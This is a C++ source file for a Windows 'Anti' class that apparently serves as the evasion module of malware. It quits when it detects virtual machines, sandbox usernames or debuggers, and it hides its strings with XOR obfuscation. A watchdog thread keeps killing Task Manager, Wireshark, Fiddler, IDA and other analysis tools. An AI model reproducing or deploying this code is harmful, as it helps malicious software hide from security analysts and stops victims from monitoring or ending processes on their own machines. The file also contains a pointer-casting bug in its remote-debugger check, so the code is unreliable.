#include "Anti.h"

void Anti::toLowerCase(char* ptr, size_t size)
{
	for (uint32_t i = 0; i < size; i++) {
		if (isupper(ptr[i]))
			ptr[i] = tolower(ptr[i]);
	}
}

void Anti::kill_process(const char* process_name) const
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, process_name) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

void Anti::check_virtual_machine()
{
	char szUsername[512];
	DWORD dwUser = sizeof(szUsername);
	GetUserNameA(szUsername, &dwUser);

	std::vector<const char*> blacklisted_users{ "guysa", "george", "john", "JOHN-PC" };

	for (uint32_t i = 0; i < blacklisted_users.size(); i++) {
		if (strcmp(szUsername, blacklisted_users[i]) == 0)
			exit(EXIT_FAILURE);
	}

	std::string sysManufacturer, sysName;
	char buf[1024];
	DWORD sz = 1024;
	int ret;

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, XorStr("HARDWARE\\ACPI\\DSDT\\VBOX__"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		exit(EXIT_FAILURE);

	ret = RegGetValueA(HKEY_LOCAL_MACHINE, XorStr("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), XorStr("SystemManufacturer"),
		RRF_RT_ANY, NULL, &buf[0], &sz);

	toLowerCase(buf, strlen(buf));
	sysManufacturer = buf;

	if (ret == ERROR_SUCCESS && (sysManufacturer.find(XorStr("vmware")) != std::string::npos ||
		sysManufacturer.find(XorStr("innotek gmbh")) != std::string::npos ||
		sysManufacturer.find(XorStr("qemu")) != std::string::npos ||
		sysManufacturer.find(XorStr("Apple inc.")) != std::string::npos ||
		sysManufacturer.find(XorStr("kvm")) != std::string::npos ||
		sysManufacturer.find(XorStr("system manufacturer")) != std::string::npos)) {
		exit(EXIT_FAILURE);
	}

	ret = RegGetValueA(HKEY_LOCAL_MACHINE, XorStr("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), XorStr("SystemProductName"),
		RRF_RT_ANY, NULL, &buf[0], &sz);

	toLowerCase(buf, strlen(buf));
	sysName = buf;

	if (ret == ERROR_SUCCESS && (sysName.find(XorStr("vmware")) != std::string::npos ||
		sysName.find(XorStr("virtualbox")) != std::string::npos ||
		sysName.find(XorStr("dell")) != std::string::npos ||
		sysName.find(XorStr("qemu")) != std::string::npos ||
		sysName.find(XorStr("intel")) != std::string::npos ||
		sysName.find(XorStr("asus")) != std::string::npos ||
		sysName.find(XorStr("system product name")) != std::string::npos)) {
		exit(EXIT_FAILURE);
	}
}

void Anti::check_debugging()
{
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	bool is_debugging = false;

	CheckRemoteDebuggerPresent(processHandle, reinterpret_cast<PBOOL>(is_debugging));

	if (is_debugging) exit(EXIT_FAILURE);
	if (IsDebuggerPresent()) exit(EXIT_FAILURE);

	SetLastError(0);
	OutputDebugStringA(XorStr("skid"));
	if (GetLastError() != 0) exit(EXIT_FAILURE);
}

void Anti::check_analyzing()
{
	for (uint32_t i = 0; i < this->processes.size(); i++)
		kill_process(this->processes[i]);
	Sleep(250);
}

void Anti::watch_dog()
{
	while (true) {
		for (uint32_t i = 0; i < this->processes.size(); i++)
			kill_process(this->processes[i]);
		Sleep(250);
	}
}

Anti::Anti(bool& check_virtual_machine, bool& check_debugging, bool& check_analyzing, bool& watch_dog)
{
	if (check_virtual_machine) this->check_virtual_machine();

	if (check_debugging) this->check_debugging();
	if (check_analyzing) {
		const char* taskmgr = XorStr("Taskmgr.exe");
		const char* ollydbg = XorStr("ollydbg.exe");
		const char* x32dbg = XorStr("x32dbg.exe");
		const char* glasswire = XorStr("glasswire.exe");
		const char* eventvwr = XorStr("mmc.exe");
		const char* wireshark = XorStr("wireshark.exe");
		const char* fiddler = XorStr("Fiddler.exe");
		const char* netlimiter = XorStr("NLClientApp.exe");
		const char* cheat_engine = XorStr("cheatengine-x86_64.exe");
		const char* ida = XorStr("idaq.exe");
		this->processes = { taskmgr, ollydbg, x32dbg, glasswire, eventvwr, wireshark, fiddler, netlimiter, cheat_engine, ida };
		this->check_analyzing();
	}

	if (watch_dog) {
		std::thread wd(&Anti::watch_dog, this);
		wd.detach();
	}
}
